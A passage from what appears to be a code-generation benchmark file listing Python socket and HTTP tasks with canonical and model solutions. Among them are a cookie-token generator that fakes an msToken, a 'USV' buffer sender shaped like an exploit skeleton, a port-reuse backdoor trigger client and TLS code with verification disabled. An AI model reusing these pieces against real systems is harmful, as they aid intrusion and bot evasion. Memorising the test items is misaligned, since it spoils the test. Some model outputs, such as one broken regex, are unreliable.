)\n                response.raise_for_status()\n                ttwid = httpx.Cookies(response.cookies).get(\"ttwid\")\n                if ttwid is None:\n                    raise APIResponseError(\"ttwid: \u68c0\u67e5\u6ca1\u6709\u901a\u8fc7, \u8bf7\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684ttwid\")\n                return ttwid\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.ttwid_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")\n\n    def gen_odin_tt(self) -> str:\n        transport = httpx.HTTPTransport(retries=5)\n        with httpx.Client(transport=transport, proxies=self.proxies) as client:\n            try:\n                response = client.get(self.odin_tt_conf[\"url\"])\n                response.raise_for_status()\n                odin_tt = httpx.Cookies(response.cookies).get(\"odin_tt\")\n                if odin_tt is None:\n                    raise APIResponseError(f\"{'odin_tt'} \u5185\u5bb9\u4e0d\u7b26\u5408\u8981\u6c42\")\n                return odin_tt\n            except httpx.RequestError as exc:\n                raise APIConnectionError(f\"\u8bf7\u6c42\u7aef\u70b9\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u5f53\u524d\u7f51\u7edc\u73af\u5883\u3002\u94fe\u63a5\uff1a{self.odin_tt_conf['url']}\uff0c\u4ee3\u7406\uff1a{self.proxies}\uff0c\u5f02\u5e38\u7c7b\u540d\uff1a{self.__class__.__name__}\uff0c\u5f02\u5e38\u8be6\u7ec6\u4fe1\u606f\uff1a{exc}\")",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "right_result": "import httpx\nimport yaml\nimport random\nimport string\nfrom typing import Dict, Any, Optional\n\nclass TokenManager:\n    def __init__(self) -> None:\n        with open('config.yaml', 'r') as f:\n            config = yaml.safe_load(f)\n        self.token_conf: Dict[str, Any] = config['token']\n        self.ttwid_conf: Dict[str, Any] = config['ttwid']\n        self.odin_tt_conf: Dict[str, Any] = config['odin_tt']\n        self.proxies: Dict[str, str] = config.get('proxies', {})\n\n    def gen_real_msToken(self) -> str:\n        retry = 3\n        for _ in range(retry):\n            try:\n                with httpx.Client(proxies=self.proxies) as client:\n                    response = client.post(\n                        url=self.token_conf['url'],\n                        headers=self.token_conf['headers'],\n                        data=self.token_conf['data']\n                    )\n                    if response.status_code == 200 and 'msToken' in response.cookies:\n                        return response.cookies['msToken']\n            except (httpx.RequestError, KeyError):\n                continue\n        return self.gen_false_msToken()\n\n    def gen_false_msToken(self) -> str:\n        return ''.join(random.choices(string.ascii_letters + string.digits, k=108))\n\n    def gen_ttwid(self, cookie: str) -> str:\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0\",\n            \"Cookie\": cookie\n        }\n        try:\n            with httpx.Client(proxies=self.proxies) as client:\n                response = client.post(\n                    url=self.ttwid_conf['url'],\n                    headers=headers,\n                    json=self.ttwid_conf['data']\n                )\n                if response.status_code == 200 and 'ttwid' in response.cookies:\n                    return response.cookies['ttwid']\n        except httpx.RequestError:\n            pass\n        return ''\n\n    def gen_odin_tt(self) -> str:\n        try:\n            with httpx.Client(proxies=self.proxies) as client:\n                response = client.get(self.odin_tt_conf['url'])\n                if response.status_code == 200 and 'odin_tt' in response.cookies:\n                    return response.cookies['odin_tt']\n        except httpx.RequestError:\n            pass\n        return ''"
  },
  {
    "Task_id": 371,
    "Instruction": "Task Description: Implement a TCP client function in Python that connects to a server, receives initial data, sends a formatted message, and handles connection errors gracefully.\n\nFunction Description: The function establishes a TCP connection to a specified server, receives initial data from the server, sends a formatted message (prefixed with \"USV \" and suffixed with '\\r\\n\\r\\n'), and ensures proper connection closure. Error handling is included to manage connection issues.\n\nInput:\n- host: [str] - The IP address or hostname of the target server\n- port: [int] - The port number on which the server is listening\n- buffer: [str] - The message content to be sent to the server\n\nOutput:\n- None (prints received data and status messages to console)\n- Prints \"Buffer Sent Successfully!\" upon successful completion\n- Prints \"Check your debugger\" if connection errors occur",
    "Canonical_solution": "import socket\n\ndef tcp_client_interaction(host, port, buffer):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect((host, port))\n        data = s.recv(1024)\n        print(\"\\n\" + data)\n        s.send(\"USV \" + buffer + '\\r\\n\\r\\n')\n    except:\n        print(\"Check your debugger\")\n    finally:\n        s.close()\n        print(\"Buffer Sent Successfully!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\n\ndef tcp_client(host, port, buffer):\n    try:\n        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        client_socket.connect((host, port))\n        initial_data = client_socket.recv(1024)\n        print(f\"Received: {initial_data.decode('utf-8')}\")\n        formatted_message = f\"USV {buffer}\\r\\n\\r\\n\"\n        client_socket.sendall(formatted_message.encode('utf-8'))\n        print(\"Buffer Sent Successfully!\")\n    except (socket.timeout, ConnectionRefusedError, socket.error) as e:\n        print(\"Check your debugger\")\n    finally:\n        try:\n            client_socket.close()\n        except:\n            pass"
  },
  {
    "Task_id": 372,
    "Instruction": "Task Description: Implement a TCP client function that communicates with a server to send specific control codes derived from a secret key, with options to start or stop port reuse.\n\nFunction Description: The function establishes a TCP connection to a specified server, generates two MD5 checkcodes from a secret, combines portions of them to create a final checkcode, extracts control codes from this checkcode, and sends either a start or stop command based on the action parameter. It handles connection errors gracefully and closes the connection after sending the command.\n\nInput:\n- ip: [str] - The IP address of the target server\n- port: [str/int] - The port number of the target server\n- action: [str] - Either \"start\" or \"stop\" to determine which control code to send\n\nOutput:\n- None (prints status messages to console)\n- Prints \"[*] Cannot connect to target\" if connection fails\n- Prints \"[*] Done!\" when operation completes (successfully or after handling failure)",
    "Canonical_solution": "import socket\nimport hashlib\n\nSECRET = \"\"\n\ndef tcp_client_communication(ip, port, action):\n    first_checkcode = hashlib.md5(SECRET.encode()).hexdigest()\n    second_checkcode = hashlib.md5(first_checkcode.encode()).hexdigest()\n    final_checkcode = first_checkcode[:24] + second_checkcode[:24]\n\n    START_PORT_REUSE = final_checkcode[16:32]\n    STOP_PORT_REUSE = final_checkcode[32:]\n\n    data = START_PORT_REUSE if action == \"start\" else STOP_PORT_REUSE\n\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(2)\n        s.connect((ip, int(port)))\n        s.send(data.encode())\n    except:\n        print(\"[*] Cannot connect to target\")\n\n    try:\n        s.recv(1024)\n    except:\n        pass\n\n    s.close()\n    print(\"[*] Done!\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport hashlib\n\ndef send_control_code(ip, port, action):\n    secret = \"mysecretpassword\"\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, int(port)))\n        \n        md5_1 = hashlib.md5((secret + \"A\").encode()).hexdigest()\n        md5_2 = hashlib.md5((secret + \"B\").encode()).hexdigest()\n        \n        combined = \"\"\n        for i in range(0, len(md5_1), 2):\n            combined += md5_1[i] if i < len(md5_1) else ''\n            combined += md5_2[i] if i < len(md5_2) else ''\n        \n        checkcode = combined[:16]\n        control_code = ''.join(f\"{int(c, 16) ^ 5}:\" for c in checkcode).rstrip(':')\n        \n        command = f\"START_REUSE {control_code}\" if action == \"start\" else f\"STOP_REUSE {control_code}\"\n        sock.sendall(command.encode())\n        \n    except (socket.error, ConnectionRefusedError):\n        print(\"[*] Cannot connect to target\")\n    finally:\n        try: sock.close()\n        except: pass\n        print(\"[*] Done!\")"
  },
  {
    "Task_id": 374,
    "Instruction": "Task Description: The task involves creating a Python function that reads log files, extracts specific messages, and sends them to a server using TCP socket communication. The function should parse log entries, identify relevant messages, and transmit them to the appropriate server ports based on the protocol specified in the logs.\n\nFunction Description: The function `send_messages_to_server` processes a log file to extract session IDs, protocols, and hexadecimal messages. It then establishes TCP connections to servers based on the protocols (using ports defined in an XML configuration file) and sends the decoded messages to the respective servers. The function includes a delay between messages to avoid overwhelming the server.\n\nInput: \n- `path` (str): The file path to the log file that contains the messages to be processed and sent. The log file should have entries matching the pattern `YYYY-MM-DD HH:MM:SS  INFO: [SESSION_ID: PROTOCOL < IP_ADDRESS] HEX_MESSAGE`.\n\nOutput: \n- None: The function does not return any value but performs side effects by sending messages to the server and closing the connections.\n\nNote: The function relies on an external XML file (`default.xml`) located in a `../setup/` directory relative to the script's location. This XML file should contain port mappings for different protocols under entries with keys ending in `.port`.",
    "Canonical_solution": "import sys\nimport re\nimport os\nimport xml.etree.ElementTree\nimport socket\nimport binascii\nimport time\n\ndef load_ports():\n    ports = {}\n    dir = os.path.dirname(os.path.abspath(__file__))\n    root = xml.etree.ElementTree.parse(dir + '/../setup/default.xml').getroot()\n    for entry in root.findall('entry'):\n        key = entry.attrib['key']\n        if key.endswith('.port'):\n            ports[key[:-5]] = int(entry.text)\n    return ports\n\ndef send_messages_to_server(path):\n    p = re.compile(r\"\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}  INFO: \\[([TU][0-9a-fA-F]{8}): (\\S+) < [\\d.]+] ([0-9a-fA-F]+)\")\n    ports = load_ports()\n    protocols = {}\n    messages = {}\n\n    for line in open(path):\n        m = p.match(line)\n        if m:\n            session = m.group(1)\n            protocol = m.group(2)\n            message = m.group(3)\n            protocols[session] = protocol\n            if session not in messages:\n                messages[session] = []\n            messages[session].append(message)\n\n    for session in protocols:\n        port = ports[protocols[session]]\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((\"localhost\", int(port)))\n        for message in messages[session]:\n            s.send(binascii.unhexlify(message))\n            time.sleep(0.1)\n        s.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "right_result": "import os\nimport re\nimport socket\nimport time\nimport xml.etree.ElementTree as ET\n\ndef send_messages_to_server(path):\n    log_pattern = re.compile(r'\\d{4}-\\d{2}-\\d{2} \\d{2}:\\d{2}:\\d{2}  INFO: $(?P<session_id>[^:]+): (?P<protocol>[^ ]+) < [^$$] (?P<hex_message>[0-9a-fA-F]+)')\n    setup_dir = os.path.join(os.path.dirname(__file__), '..', 'setup')\n    xml_path = os.path.join(setup_dir, 'default.xml')\n\n    protocol_ports = {}\n    tree = ET.parse(xml_path)\n    root = tree.getroot()\n    for entry in root.findall('.//entry'):\n        if entry.get('key', '').endswith('.port') and entry.text:\n            protocol = entry.get('key').split('.')[1]\n            protocol_ports[protocol] = int(entry.text)\n\n    sessions = {}\n    with open(path, 'r') as file:\n        for line in file:\n            match = log_pattern.search(line)\n            if match:\n                session_id = match.group('session_id')\n                protocol = match.group('protocol')\n                hex_message = match.group('hex_message')\n                if protocol not in sessions:\n                    sessions[protocol] = []\n                try:\n                    message = bytes.fromhex(hex_message)\n                    sessions[protocol].append(message)\n                except ValueError:\n                    continue\n\n    connections = {}\n    for protocol, messages in sessions.items():\n        port = protocol_ports.get(protocol)\n        if not port:\n            continue\n        try:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect(('localhost', port))\n            connections[protocol] = sock\n            for message in messages:\n                sock.sendall(message)\n                time.sleep(0.1)\n        except (socket.error, OSError) as e:\n            if protocol in connections:\n                connections[protocol].close()\n                del connections[protocol]\n\n    for sock in connections.values():\n        sock.close()"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Python class that implements a socket-based client for TCP and UDP communication, supporting connection pooling and various socket options. The class should handle both stream (TCP) and datagram (UDP) protocols, with methods for sending/receiving data and managing connections.\n\nClass Description: The `Socket` class provides a flexible interface for socket communication, supporting both IPv4 and Unix domain sockets (if available). It manages connection pooling, socket options, and protocol-specific communication methods.\n\nAttributes:\n\nconnection_pool: [Queue] - A queue for managing socket connections in a pool\ntimeout: [float/None] - Default timeout for socket operations\nconnection: [namedtuple] - Stores connection details (target address, protocol, socket options)\nsend_and_receive: [method] - Protocol-specific method for communication (stream or datagram)\non_unix: [bool] - Flag indicating if Unix domain sockets are available\nprotocols: [dict] - Mapping of protocol names to (address family, socket type) tuples\nstreams: [set] - Set of stream-oriented protocols (TCP, Unix stream)\ndatagrams: [set] - Set of datagram-oriented protocols (UDP, Unix datagram)\ninet: [set] - Set of Internet protocols (TCP, UDP)\nunix: [set] - Set of Unix domain protocols (if available)\n\nMethods:\n\n__init__: [constructor](connect_to: tuple, proto: str, version=None, headers=empty.dict, timeout=None, pool=0, raise_on=(500,), **kwargs) -> None - Initializes the socket client with connection parameters and optional pool size\nsettimeout: [method](timeout: float) -> None - Sets the default timeout for socket operations\nsetsockopt: [method](*sockopts: tuple/list) -> None - Adds socket options to be applied to new connections\n_register_socket: [method]() -> socket.socket - Creates and configures a new socket connection\n_stream_send_and_receive: [method](_socket: socket.socket, message: str, *args, **kwargs) -> BytesIO - Handles stream protocol communication (TCP)\n_dgram_send_and_receive: [method](_socket: socket.socket, message: str, buffer_size=4096, *args) -> BytesIO - Handles datagram protocol communication (UDP)\nrequest: [method](message: str, timeout=False, *args, **kwargs) -> Response - Main method for sending requests and receiving responses, managing connection pool",
    "Canonical_solution": "import socket\nfrom collections import namedtuple\nfrom io import BytesIO\nfrom queue import Queue\n\nResponse = namedtuple(\"Response\", (\"data\", \"status_code\", \"headers\"))\n\nclass Socket:\n    __slots__ = (\"connection_pool\", \"timeout\", \"connection\", \"send_and_receive\")\n\n    on_unix = getattr(socket, \"AF_UNIX\", False)\n    Connection = namedtuple(\"Connection\", (\"connect_to\", \"proto\", \"sockopts\"))\n    protocols = {\n        \"tcp\": (socket.AF_INET, socket.SOCK_STREAM),\n        \"udp\": (socket.AF_INET, socket.SOCK_DGRAM),\n    }\n    streams = set((\"tcp\",))\n    datagrams = set((\"udp\",))\n    inet = set((\"tcp\", \"udp\"))\n    unix = set()\n\n    if on_unix:\n        protocols.update(\n            {\n                \"unix_dgram\": (socket.AF_UNIX, socket.SOCK_DGRAM),\n                \"unix_stream\": (socket.AF_UNIX, socket.SOCK_STREAM),\n            }\n        )\n        streams.add(\"unix_stream\")\n        datagrams.add(\"unix_dgram\")\n        unix.update((\"unix_stream\", \"unix_dgram\"))\n\n    def __init__(\n        self,\n        connect_to,\n        proto,\n        version=None,\n        headers=empty.dict,\n        timeout=None,\n        pool=0,\n        raise_on=(500,),\n        **kwargs\n    ):\n        self.timeout = timeout\n        self.connection = Socket.Connection(connect_to, proto, set())\n        self.connection_pool = Queue(maxsize=pool if pool else 1)\n\n        if proto in Socket.streams:\n            self.send_and_receive = self._stream_send_and_receive\n        else:\n            self.send_and_receive = self._dgram_send_and_receive\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        if type(sockopts[0]) in (list, tuple):\n            for sock_opt in sockopts[0]:\n                level, option, value = sock_opt\n                self.connection.sockopts.add((level, option, value))\n        else:\n            level, option, value = sockopts\n            self.connection.sockopts.add((level, option, value))\n\n    def _register_socket(self):\n        _socket = socket.socket(*Socket.protocols[self.connection.proto])\n        _socket.settimeout(self.timeout)\n\n        if self.connection.sockopts:\n            for sock_opt in self.connection.sockopts:\n                level, option, value = sock_opt\n                _socket.setsockopt(level, option, value)\n\n        _socket.connect(self.connection.connect_to)\n        return _socket\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        data = BytesIO()\n\n        _socket_fd = _socket.makefile(mode=\"rwb\", encoding=\"utf-8\")\n        _socket_fd.write(message.encode(\"utf-8\"))\n        _socket_fd.flush()\n\n        for received in _socket_fd:\n            data.write(received)\n        data.seek(0)\n\n        _socket_fd.close()\n        return data\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        _socket.send(message.encode(\"utf-8\"))\n        data, address = _socket.recvfrom(buffer_size)\n        return BytesIO(data)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if not self.connection_pool.full():\n            self.connection_pool.put(self._register_socket())\n\n        _socket = self.connection_pool.get()\n\n        if timeout or timeout is None:\n            _socket.settimeout(timeout)\n\n        data = self.send_and_receive(_socket, message, *args, **kwargs)\n\n        if self.connection.proto in Socket.streams:\n            _socket.shutdown(socket.SHUT_RDWR)\n\n        return Response(data, None, None)",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nfrom collections import namedtuple\nfrom threading import Lock\nfrom queue import Queue, Empty\nfrom io import BytesIO\nimport functools\nimport os\n\nConnection = namedtuple('Connection', ['target', 'proto', 'sockopts'])\nResponse = namedtuple('Response', ['data', 'address', 'error'])\n\nclass Socket:\n    def __init__(self, connect_to, proto='tcp', version=None, headers={}, timeout=None, pool=0, raise_on=(500,), **kwargs):\n        self.timeout = timeout\n        self.connection_pool = Queue(maxsize=pool)\n        self._lock = Lock()\n        self.on_unix = hasattr(socket, 'AF_UNIX')\n        self.protocols = {\n            'tcp': (socket.AF_INET, socket.SOCK_STREAM),\n            'udp': (socket.AF_INET, socket.SOCK_DGRAM),\n        }\n        if self.on_unix:\n            self.protocols['unix_stream'] = (socket.AF_UNIX, socket.SOCK_STREAM)\n            self.protocols['unix_dgram'] = (socket.AF_UNIX, socket.SOCK_DGRAM)\n        \n        self.streams = {'tcp', 'unix_stream'}\n        self.datagrams = {'udp', 'unix_dgram'}\n        self.inet = {'tcp', 'udp'}\n        self.unix = {'unix_stream', 'unix_dgram'} if self.on_unix else set()\n\n        proto = proto.lower()\n        if proto not in self.protocols:\n            raise ValueError(f\"Unsupported protocol: {proto}\")\n        \n        self.connection = Connection(connect_to, proto, [])\n        self.raise_on = raise_on\n        self.headers = headers.copy()\n        self.sockopts = []\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        self.sockopts.extend(sockopts)\n\n    def _register_socket(self):\n        family, socktype = self.protocols[self.connection.proto]\n        sock = socket.socket(family, socktype)\n        for opt in self.sockopts:\n            if isinstance(opt, (tuple, list)):\n                level, optname, value = opt\n            else:\n                level = socket.SOL_SOCKET\n                optname, value = opt\n            sock.setsockopt(level, optname, value)\n        if self.connection.proto in self.streams:\n            sock.setblocking(0)\n            sock.connect_ex(self.connection.target)\n        return sock\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        try:\n            _socket.sendall(message.encode() if isinstance(message, str) else message)\n            data = BytesIO()\n            while True:\n                chunk = _socket.recv(4096)\n                if not chunk:\n                    break\n                data.write(chunk)\n            return data.getvalue()\n        except Exception as e:\n            return Response(b'', None, e)\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        try:\n            if self.connection.proto in self.inet:\n                sent = _socket.sendto(message.encode() if isinstance(message, str) else message, self.connection.target)\n                data, addr = _socket.recvfrom(buffer_size)\n                return Response(data, addr, None)\n            else:\n                _socket.send(message.encode() if isinstance(message, str) else message)\n                data = _socket.recv(buffer_size)\n                return Response(data, None, None)\n        except Exception as e:\n            return Response(b'', None, e)\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        try:\n            sock = self.connection_pool.get_nowait()\n        except Empty:\n            sock = self._register_socket()\n        \n        try:\n            if self.connection.proto in self.streams:\n                response = self._stream_send_and_receive(sock, message, *args, **kwargs)\n            else:\n                response = self._dgram_send_and_receive(sock, message, *args, **kwargs)\n            \n            if isinstance(response, Response):\n                data, addr, error = response\n                if error and any(code in str(error) for code in self.raise_on):\n                    raise error\n            else:\n                data, addr, error = response, None, None\n            \n            try:\n                self.connection_pool.put_nowait(sock)\n            except Full:\n                sock.close()\n        except Exception as e:\n            sock.close()\n            raise\n        \n        return Response(data, addr, error)"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a thread-safe TCP socket wrapper class that handles connection management, data transmission, and SSL/TLS encryption with proper resource cleanup.\n\nClass Description: SafeStreamSocket is a robust socket wrapper that provides safe connection handling, unique socket identification, and SSL/TLS capabilities. It manages socket lifecycle including proper cleanup and supports both IPv4 and Unix domain sockets.\n\nAttributes:\n_id: [int] - Unique identifier for the socket instance\n_dup_sock: [socket.socket] - Duplicate socket used during SSL/TLS handshake\n_name: [str] - Optional name identifier for the socket\n_sock: [socket.socket] - Main socket connection object\n_finalizer: [weakref.finalize] - Weak reference finalizer for cleanup\n_id_numbers: [class attribute, list[int]] - Tracks all active socket IDs\n_n: [class attribute, list[int]] - Counter for generating unique IDs\n\nMethods:\n__init__: [constructor](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None - Initializes socket connection with the given address\n_acquire_uid: [_acquire_uid]() -> int - Generates a unique ID for the socket instance\n_connect: [_connect](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket - Establishes connection to the specified address\n_cleanup: [_cleanup]() -> None - Performs cleanup operations when socket is closed\n_release_uid: [_release_uid](id: int) -> None - Releases the socket ID when closed\nclose: [close]() -> None - Closes the socket connection\nclosed: [property]() -> bool - Returns whether socket is closed\nid: [property]() -> int - Returns socket ID\nname: [property]() -> str - Gets socket name\nname: [setter](new_name: str) -> None - Sets socket name\nget_socket: [get_socket]() -> socket.socket - Returns underlying socket object\nrecv: [recv](bufsize: int = 4096) -> bytes - Receives data from socket\nrecvall: [recvall](size: int) -> bytearray - Receives exact amount of data\nsendall: [sendall](data: Union[bytes, bytearray]) -> int - Sends all data through socket\nswitch_to_ssl: [switch_to_ssl](pemfile: str) -> None - Upgrades connection to SSL/TLS\n__enter__: [__enter__]() -> SafeStreamSocket - Context manager entry\n__exit__: [__exit__](*args) -> None - Context manager exit",
    "Canonical_solution": "import logging\nimport os\nimport socket\nimport ssl\nimport threading\nimport typing\nimport weakref\nfrom typing import Any, Union\n\nclass SafeStreamSocket:\n    def __init__(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n\n    def _acquire_uid(self) -> int:\n        with threading.Lock():\n            self._id_numbers.append(self._n[0])\n            _id = self._n[0]\n            self._n[0] += 1\n        logging.debug(\"Opening socket: id=%d\", _id)\n        return _id\n\n    def _connect(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            return addr\n        if isinstance(addr, str):\n            if ':' in addr:\n                host, port = addr.split(\":\", 1)\n                addr = (host, int(port))\n                family = socket.AF_INET\n            elif os.path.exists(addr):\n                family = socket.AF_UNIX\n            else:\n                raise SocketError(f\"socket unix:{addr} unable to connect\")\n        else:\n            family = socket.AF_INET\n        sock = socket.socket(family, socket.SOCK_STREAM)\n        sock.connect(addr)\n        return sock\n\n    def _cleanup(self):\n        self._release_uid(self.id)\n        sock = self._dup_sock or self._sock\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def _release_uid(self, id: int):\n        try:\n            self._id_numbers.remove(id)\n        except ValueError:\n            pass\n        logging.debug(\"Closing socket, id=%d\", id)\n\n    def close(self):\n        self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return not self._finalizer.alive\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str):\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        try:\n            return self._sock.recv(bufsize)\n        except socket.timeout as e:\n            raise SocketError(\"socket timeout\") from e\n        except ssl.SSLError as e:\n            raise SocketError(\"ssl error\") from e\n        except Exception as e:\n            raise SocketError(\"socket error\") from e\n\n    def recvall(self, size: int) -> bytearray:\n        buf = bytearray()\n        while len(buf) < size:\n            chunk = self.recv(size-len(buf))\n            if not chunk:\n                raise SocketError(\"recvall: socket connection broken\")\n            buf.extend(chunk)\n        return buf\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        try:\n            return self._sock.sendall(data)\n        except Exception as e:\n            raise SocketError(\"sendall error\") from e\n\n    def switch_to_ssl(self, pemfile):\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n        try:\n            context.verify_mode = ssl.CERT_NONE\n            context.set_ciphers(\"ALL:@SECLEVEL=0\")\n        except ssl.SSLError:\n            pass\n        self._dup_sock = self._sock.dup()\n        context.load_cert_chain(pemfile, keyfile=pemfile)\n        context.check_hostname = False\n        self._sock = context.wrap_socket(self._sock, server_hostname=\"iphone.localhost\")\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *args):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "right_result": "import socket\nimport ssl\nimport threading\nimport weakref\nfrom typing import Union, Tuple, Any\nimport os\n\nclass SafeStreamSocket:\n    _id_numbers = []\n    _n = [0]\n\n    def __init__(self, addr: Union[str, Tuple[str, int], socket.socket, Any] = None):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = \"\"\n        self._sock = None\n        self._lock = threading.Lock()\n        self._finalizer = weakref.finalize(self, self._cleanup)\n        if addr is not None:\n            self._sock = self._connect(addr)\n\n    def _acquire_uid(self) -> int:\n        with self._lock:\n            while True:\n                new_id = self._n[0]\n                self._n[0] += 1\n                if new_id not in self._id_numbers:\n                    self._id_numbers.append(new_id)\n                    return new_id\n\n    def _connect(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            self._dup_sock = addr.dup()\n            return addr\n        elif isinstance(addr, tuple) and len(addr) == 2:\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            sock.connect(addr)\n            return sock\n        elif isinstance(addr, str) and os.path.exists(addr):\n            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n            sock.connect(addr)\n            return sock\n        else:\n            raise ValueError(\"Unsupported address format\")\n\n    def _cleanup(self) -> None:\n        with self._lock:\n            if self._sock:\n                try:\n                    self._sock.shutdown(socket.SHUT_RDWR)\n                except:\n                    pass\n                try:\n                    self._sock.close()\n                finally:\n                    self._sock = None\n            if self._dup_sock:\n                try:\n                    self._dup_sock.close()\n                finally:\n                    self._dup_sock = None\n            self._release_uid(self._id)\n\n    def _release_uid(self, id: int) -> None:\n        with self._lock:\n            if id in self._id_numbers:\n                self._id_numbers.remove(id)\n\n    def close(self) -> None:\n        if self._finalizer:\n            self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return self._sock is None or self._sock.fileno() < 0\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str) -> None:\n        with self._lock:\n            self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        with self._lock:\n            if self.closed:\n                raise ConnectionError(\"Socket is closed\")\n            return self._sock.recv(bufsize)\n\n    def recvall(self, size: int) -> bytearray:\n        with self._lock:\n            if self.closed:\n                raise ConnectionError(\"Socket is closed\")\n            result = bytearray()\n            remaining = size\n            while remaining > 0:\n                data = self._sock.recv(min(remaining, 4096))\n                if not data:\n                    raise ConnectionError(\"Connection closed\")\n                result.extend(data)\n                remaining -= len(data)\n            return result\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        with self._lock:\n            if self.closed:\n                raise ConnectionError(\"Socket is closed\")\n            total_sent = 0\n            data_len = len(data)\n            view = memoryview(data)\n            while total_sent < data_len:\n                sent = self._sock.send(view[total_sent:])\n                if sent == 0:\n                    raise ConnectionError(\"Connection broken\")\n                total_sent += sent\n            return total_sent\n\n    def switch_to_ssl(self, pemfile: str) -> None:\n        with self._lock:\n            if self.closed:\n                raise ConnectionError(\"Socket is closed\")\n            context = ssl.create_default_context(cafile=pemfile)\n            context.check_hostname = False\n            self._dup_sock = context.wrap_socket(self._sock.dup(), server_side=False)\n            self._sock.close()\n            self._sock = self._dup_sock\n\n    def __enter__(self) -> 'SafeStreamSocket':\n        return self\n\n    def __exit__(self, *args) -> None:\n        self.close()"
  },
  {
    "Task_id": 377,
    "Instruction": "Task Description: Create a TCP/UDP/RAW socket server class that can handle incoming connections, receive data, and optionally send responses. The server should support different protocols (TCP, UDP, RAW) and provide methods for single interaction or receiving until a specific pattern is matched.\n\nClass Description: MiniTestServer is a versatile socket server implementation that supports TCP, UDP, and RAW packet protocols. It can operate in silent mode (only receiving) or respond to clients, and includes timeout handling for operations.\n\nAttributes:\n- server_socket: [socket.socket] - The underlying socket object\n- received: [bytes] - The last received data from a client\n- data_to_send: [bytes] - Default data to send in response (default: b\"\\xfe\\xeb\\xda\\xed\")\n- active_port: [int] - The port number the server is bound to\n- stay_silent: [bool] - If True, server won't send responses (default: False)\n- proto: [str] - Protocol type ('tcp', 'udp', or 'raw') (default: 'tcp')\n- host: [str] - Host address to bind to (default: '0.0.0.0')\n- timeout: [int] - Operation timeout in seconds (default: 5)\n\nMethods:\n- __init__(stay_silent=False, proto=\"tcp\", host=\"0.0.0.0\") -> None - Initializes the server with optional parameters\n- bind() -> None - Creates and binds the socket according to the specified protocol\n- serve_once() -> None - Handles a single client interaction (receive and optionally send)\n- receive_until(expected) -> None - (RAW only) Receives data until matching expected pattern or timeout",
